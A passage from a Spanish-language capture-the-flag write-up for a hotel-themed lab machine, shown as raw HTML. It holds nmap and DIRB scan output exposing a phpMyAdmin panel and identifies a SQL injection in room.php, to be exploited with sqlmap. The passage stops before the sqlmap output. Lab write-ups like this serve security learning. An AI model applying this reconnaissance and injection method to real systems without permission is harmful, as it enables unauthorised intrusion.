&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 77:d4:ae:1f:b0:be:15:1f:f8💿c8:15:3a:c3:69:e1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.25 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jul  6 03:58:33 2019 -- 1 IP address (1 host up) scanned in 16.02 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;Realizamos un escaneo de archivos/directorios en la pagina web con DIRB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jul &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 15:30:40 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
URL_BASE: http://10.10.10.143/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: &lt;span class=&#34;m&#34;&gt;4612&lt;/span&gt;                                                          

---- Scanning URL: http://10.10.10.143/ ----
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/css/                                                                                                               
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/fonts/                                                                                                             
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/images/                                                                                                            
+ http://10.10.10.143/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:23628&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                                 
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/js/                                                                                                                
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/                                                                                                        
+ http://10.10.10.143/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:403&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:300&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                               
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/css/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/fonts/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/images/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/js/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/ ----
+ http://10.10.10.143/phpmyadmin/ChangeLog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:19186&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                      
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/doc/                                                                                                    
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/examples/                                                                                               
+ http://10.10.10.143/phpmyadmin/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:22486&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                    
+ http://10.10.10.143/phpmyadmin/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:15211&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                      
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/js/                                                                                                     
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/libraries/                                                                                              
+ http://10.10.10.143/phpmyadmin/LICENSE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:18092&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                        
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/locale/                                                                                                 
+ http://10.10.10.143/phpmyadmin/phpinfo.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:15215&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                    
+ http://10.10.10.143/phpmyadmin/README &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:1520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                          
+ http://10.10.10.143/phpmyadmin/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:26&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                        
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/                                                                                                  
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/sql/                                                                                                    
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/templates/                                                                                              
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/themes/                                                                                                 
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/tmp/                                                                                                    
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/vendor/                                                                                                 
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/doc/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/examples/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/js/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/libraries/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/locale/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/setup/ ----
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/frames/                                                                                           
+ http://10.10.10.143/phpmyadmin/setup/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SIZE:10541&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                                                
&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/lib/                                                                                              
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/sql/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/templates/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/themes/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/tmp/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/vendor/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/setup/frames/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                                                                                                      
---- Entering directory: http://10.10.10.143/phpmyadmin/setup/lib/ ----
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Use mode &lt;span class=&#34;s1&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you want to scan it anyway&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
                                                                               
-----------------
END_TIME: Thu Jul &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 16:38:46 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
DOWNLOADED: &lt;span class=&#34;m&#34;&gt;13836&lt;/span&gt; - FOUND: &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un panel de administracion de phpmyadmin, al intentar ingresar con credenciales por default no fue posible.&lt;/p&gt;
&lt;h2 id=&#34;sqli&#34;&gt;SQLi&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de vulnerabilidades dentro de la pagina web viendo sus parametros en urls y encontramos que en la pagina rooms se encuentra una vulnerabilidad de tipo sql injection.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;http://supersecurehotel.htb/room.php?cod&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos sqlmap para poder explotar esta vulnerabilidad y encontramos distintas bases de datos.&lt;/p&gt;
&lt;h3 id=&#34;sqlmap&#34;&gt;SQLMAP&lt;/h3&gt;
&lt;p&gt;Dentro de las bases de datos que encontramos no vimos nada que pudiese ayudar a obtener acceso a la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
